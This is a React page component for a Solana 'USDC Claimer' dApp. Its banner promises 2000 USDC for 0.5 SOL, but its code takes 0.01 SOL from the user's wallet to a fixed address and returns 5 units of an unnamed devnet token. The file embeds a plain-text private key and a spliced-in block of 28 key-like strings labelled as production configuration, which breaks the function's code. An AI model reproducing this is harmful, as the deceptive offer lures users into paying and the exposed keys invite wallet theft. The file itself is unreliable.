/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "51rhe1opwDEKguPRiiU65S2kFXSt5ZYdGSAnQZ2brUr42VR3smDudXnUH177UdB9M1fmJtrGNucR1FmUQxSiAuGr"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "YwALeGspubmEaavuZTrvzbs23jghqBkqBqF6uHiYc7jfA3oFiWhXbtaavhcsobnhjiAYbjuxSv769gEKNEYUe7Z",
  "key1": "3QRsYknwcGaTtvXN5tHzPi58xTKmBb6iRx4HXdcYYtx9xtDJnhVAqh2ejmUAyuAFrrnYaGgJNVXLfaZpUg4MvrgF",
  "key2": "2kXKNef7xAV9uLao7z6dEtQ7YEbe2LWWx8AgLUvxPFZdnigJWgtJai4EuEm28wGXX4teNaDbEf2m9UxXi7ii9VrY",
  "key3": "2KjUxwLwpZoD1c5wqvYH3K1sGPvkqb7gBvA5dBUjqDy2BB3KGfudjfpjpA8YPeX5Ux7JLkoh1qf96p6K5hK5jbg3",
  "key4": "2eVv5BPqUhRHYASRqYBDEiy5DiasHWie1ievxwprMNNBDtP9Xdjdey98KZvCBXudgsRHjw3D9Rx3ZDeUXqFUMZcA",
  "key5": "2VJRJWi25ohupkNP2v6E2obgxAyjY4RD4THg6ZyBAB12ayT9a32GLJ9RCvmNn8EWRHHbrcUiv5BW7yBn2k3YJve9",
  "key6": "3kM5kF6k87M64WCgQVZnfgYfXU7dBBLpggAhhhja1dnKrbMr2tU4fnYa2USy1vtnzwHgPDjgFCRDJtVRJu14Laht",
  "key7": "3tuUcb5ntT2CiKvUXjqhB1QK1LJPqKnPu8e8MCxkJvQbr38FN8s7H4dU85Z2r47VJj6LDu5VLKg8za2K98grft7p",
  "key8": "5ZLXhPB5mS9LCDyFF6sWg3QUCXRTVEwxJpUd1hLMXEzQmPS1tFnnEtpUAURj6b7eVS6YnsVrPpJXytWZ9ah4bTp3",
  "key9": "3Ph9RHvLjyE1zYURJJsrcS3SXaYNvbHS8SogQvY9xpMhLV3eLE9xpoB72iMVt3PuKxSyS23cTwjMiK1C7wHBXDex",
  "key10": "mcKSzzz8ufDvfQadwXkkNGXbv7B1bzEJaw6CsqpeMqQu7oSHnpwEhLt37YJwTeHQhf9WzWdx5gQZakWe8Q16ob2",
  "key11": "aTaYuEyZF2XVvJACTAN7fmfVcszyibuHz4sTWuFwfvFpVAW9ANTD8eisUCLVSDdQbFk9wYuRX2CKZCX7j5nJ985",
  "key12": "4ML52tq9JGVsP9ZLmxURP9ipqpRuaFwEe5A4AxcPdYZyHYpe6xZUi9yWKmneQDx2W3YKUq8c7EZULUhEuaQYmtxc",
  "key13": "3kvJ9vsGQqw32uyyXdLDSaSHMQdvuH4HDXX6kqaetGaeNPZiHTtZCuNJCQYbCFKbcrLh1nHmEPnsh8mcEXWvyMXK",
  "key14": "67MxyhNm8SLGXQusLemR7j1c7K5vh29jXabu62XmSsRFviWL6gqrY6T9XWHQgpAfjaPnb75MEJC16EaYGRH8ZfKs",
  "key15": "29yhHsUufTWWgkHfG9AdvbTmJgo2qf5hPqcykwdsJnxGeFRHLLtZXgVVyFsLGve5sb9xqia9b5L3m12dpJ8dvUds",
  "key16": "e1pj2P6dBSSR7AkRi1ckaQbjJhsrDgNUnFKbnSMphaJTqJ7gdsZbYAnYw2A91AqmABdERpcqCHNK1KpHmHrYzeT",
  "key17": "5eELTdvNaVXjcjMDzSTVVCab3yAL9oz1BHRt8BnFUhqzQ3SzR5BLXkwQAv7Nh7vHz3XTDeVhFGcFkjV7D6Zpt48H",
  "key18": "26uDUookik5h9ru8ZQdhiPs7Tk4omQhaJTf6JkxDvHtfjQysctqTDzyLS8FDUFH2fvxQRmq9qkLNN5iAzp1DNWD8",
  "key19": "5dXPzFSipdqvApjZPmMNgzeZuFjACVSva6GTtMRkP2WXwtgJtWt6k3ifzougy7CtJVymxXEEcXZ2JAfiQaHjLmBN",
  "key20": "5oVbgvhrkXY4gMKpARddzUq2wd4ZDSbXLNTAFnV1TDfcfzkYwNhu8nX5q58sGtN9HtvHgGwCnK6fPp2b5iR5TR57",
  "key21": "55wmBuWopRpQjcsBKpUai3iotx4NQApTtnKwf8mNFpiCcmANVeBrGe8TBfbqfRhRsBoxVy5iNyQVJChtjmjE9JYd",
  "key22": "4YrmS8YFgfF8AJ4RrG3WTAaFkTVovCh23Pt69KVxFnFdxS6H6TBnY4WNQyCUF99xA11B3H6SUhiDZLronSJWeqJW",
  "key23": "2LTamRUnCoivmCsJyarPQAfHj3FE1vnFxmMyb8ZZriBhR6KZqq4iu6ecau2vJv2gfnjhGsVs6tFFzVZCDVU9EExm",
  "key24": "2CAceXUeuewrikmiVKZgiACiny21655cMfvFdQQBdevLXzThUmzQxM5TVM41HHuEek2wuaLYjjUv6nSk6GMsnETx",
  "key25": "41McgrS8JPCfCBUPVKqrFb7Et3wdzMuNq1D4tkDKG6W1bfYuetjLapmA9qmUypP2CNm6RNXGkudNFbb7nSnqcLqa",
  "key26": "4co9q3wd5Tvqyjv6LPuAP8XLmjejBWq7bDfZc66WRiNxofhFspCQj8k4cZ3g1fvWhnRWWguyKAM9qu6ypCZGyFCk",
  "key27": "5RVVWqvYC1eN14Gb9KRRj5Rq6o7kfwrn6gRRuZvYtMeh68rbBdrcJHqpf4veFGgZpnidCyM8n7qUMZpCoH9dpAsZ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
